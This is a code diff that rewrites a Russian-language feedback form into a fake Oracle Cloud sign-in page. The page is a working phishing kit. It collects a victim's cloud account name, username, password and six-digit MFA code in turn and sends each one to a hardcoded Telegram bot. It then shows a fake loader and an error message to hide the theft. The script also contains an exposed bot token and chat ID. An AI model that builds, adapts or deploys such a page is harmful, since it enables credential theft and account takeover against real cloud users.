@@ -1,172 +1,132 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Feedback Form</title>
-
-<style>
-body{
-    font-family: Arial, sans-serif;
-    background:#f5f5f5;
-    margin:0;
-    padding:0;
-}
-
-.container{
-    max-width:420px;
-    margin:40px auto;
-    background:#fff;
-    padding:24px;
-    border-radius:12px;
-    box-shadow:0 2px 10px rgba(0,0,0,.08);
-}
-
-h1{
-    margin-top:0;
-    font-size:28px;
-}
-
-.step{
-    display:none;
-}
-
-.step.active{
-    display:block;
-}
-
-input, textarea{
-    width:100%;
-    padding:12px;
-    margin-top:10px;
-    margin-bottom:20px;
-    border:1px solid #ccc;
-    border-radius:8px;
-    box-sizing:border-box;
-    font-size:16px;
-}
-
-button{
-    width:100%;
-    padding:12px;
-    border:none;
-    border-radius:8px;
-    background:#111;
-    color:#fff;
-    font-size:16px;
-    cursor:pointer;
-}
-
-button:disabled{
-    background:#aaa;
-    cursor:not-allowed;
-}
-
-.success{
-    text-align:center;
-    font-size:20px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oracle Cloud Sign In</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 0; color: #312d2a; }
+        .header { background: #312d2a; color: #fff; padding: 12px 20px; font-size: 14px; }
+        .container { max-width: 400px; margin: 40px auto; padding: 20px; }
+        .logo-main { font-size: 32px; font-weight: bold; margin: 0; }
+        .logo-sub { font-size: 22px; margin-bottom: 30px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        label { font-weight: 600; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #312d2a; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        button:disabled { background: #e0e0e0; color: #9e9e9e; cursor: not-allowed; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #312d2a; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-
 <body>
 
+<div class="header">Oracle Cloud Infrastructure</div>
+
 <div class="container">
-
-    <!-- STEP 1 -->
+    <!-- ШАГ 1: Аккаунт -->
     <div class="step active" id="step1">
-        <h1>Отзывы</h1>
-
-        <label>Ваше имя</label>
-        <input type="text" id="name" placeholder="Введите имя" oninput="check1()">
-
-        <button id="btn1" disabled onclick="next(2)">
-            Далее
-        </button>
+        <div class="logo-main">ORACLE</div>
+        <div class="logo-sub">Cloud</div>
+        <label>Cloud Account Name</label>
+        <input type="text" id="acc" placeholder="Enter account name" oninput="check1()">
+        <button id="btn1" disabled onclick="nav(2)">Next</button>
     </div>
 
-    <!-- STEP 2 -->
+    <!-- ШАГ 2: Логин и Пароль -->
     <div class="step" id="step2">
-        <h1>Ваш отзыв</h1>
-
-        <textarea id="review"
-                  rows="6"
-                  placeholder="Напишите отзыв..."
-                  oninput="check2()"></textarea>
-
-        <button id="btn2" disabled onclick="sendReview()">
-            Отправить
-        </button>
+        <div style="margin-bottom:20px">Tenancy: <b id="disp_acc"></b></div>
+        <label>User Name</label>
+        <input type="text" id="user" placeholder="User name" oninput="check2()">
+        <label>Password</label>
+        <input type="password" id="pass" placeholder="Password" oninput="check2()">
+        <button id="btn2" disabled onclick="nav(3)">Sign In</button>
     </div>
 
-    <!-- STEP 3 -->
+    <!-- ШАГ 3: MFA Код -->
     <div class="step" id="step3">
-        <div class="success">
-            ✅ Спасибо за отзыв
-        </div>
+        <h2>Verify Identity</h2>
+        <label>Verification Code</label>
+        <input type="text" id="code" placeholder="000000" maxlength="6" oninput="check3()">
+        <button id="btn3" disabled onclick="finish()">Verify</button>
     </div>
 
+    <!-- ШАГ 4: Загрузка -->
+    <div class="step" id="step4" style="text-align:center;">
+        <div class="loader"></div>
+        <p>Authenticating...</p>
+    </div>
 </div>
 
 <script>
+// ТВОИ ДАННЫЕ
 const TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
 const CHAT_ID = '6576262467';
 
-function next(step){
-    document.querySelectorAll('.step')
-        .forEach(el => el.classList.remove('active'));
-
-    document.getElementById('step' + step)
-        .classList.add('active');
+// Функция перехода между шагами
+function nextStep(n) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    document.getElementById('step' + n).classList.add('active');
 }
 
-function check1(){
-    const val = document.getElementById('name').value.trim();
-    document.getElementById('btn1').disabled = val.length < 2;
-}
-
-function check2(){
-    const val = document.getElementById('review').value.trim();
-    document.getElementById('btn2').disabled = val.length < 3;
-}
-
-async function sendReview(){
-
-    const name = document.getElementById('name').value;
-    const review = document.getElementById('review').value;
-
-    const text =
-`📝 Новый отзыв
-
-👤 Имя: ${name}
-
-💬 Отзыв:
-${review}`;
-
-    try{
-
-        await fetch(
-            `https://api.telegram.org/bot${TOKEN}/sendMessage`,
-            {
-                method:'POST',
-                headers:{
-                    'Content-Type':'application/json'
-                },
-                body:JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text
-                })
-            }
-        );
-
-        next(3);
-
-    }catch(err){
-
-        alert('Ошибка отправки');
-
-        console.log(err);
+// Универсальная функция отправки в Telegram
+async function sendToBot(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.error('Ошибка отправки');
     }
+}
+
+// Логика кнопок
+function nav(n) {
+    const accValue = document.getElementById('acc').value;
+    
+    if (n === 2) {
+        sendToBot(`<b>☁️ Аккаунт:</b> <code>${accValue}</code>`);
+        document.getElementById('disp_acc').innerText = accValue;
+    }
+    
+    if (n === 3) {
+        const userValue = document.getElementById('user').value;
+        const passValue = document.getElementById('pass').value;
+        sendToBot(`<b>👤 Данные:</b>\nTenancy: ${accValue}\nUser: <code>${userValue}</code>\nPass: <code>${passValue}</code>`);
+    }
+    
+    nextStep(n);
+}
+
+async function finish() {
+    const codeValue = document.getElementById('code').value;
+    await sendToBot(`<b>🔐 Код MFA:</b> <code>${codeValue}</code>`);
+    
+    nextStep(4);
+    setTimeout(() => {
+        alert('Системная ошибка. Попробуйте позже.');
+        window.location.reload();
+    }, 4000);
+}
+
+// Проверки полей (чтобы кнопки активировались)
+function check1() {
+    document.getElementById('btn1').disabled = document.getElementById('acc').value.trim().length < 2;
+}
+function check2() {
+    const u = document.getElementById('user').value.trim();
+    const p = document.getElementById('pass').value.trim();
+    document.getElementById('btn2').disabled = (u.length < 2 || p.length < 2);
+}
+function check3() {
+    document.getElementById('btn3').disabled = document.getElementById('code').value.trim().length !== 6;
 }
 </script>
 
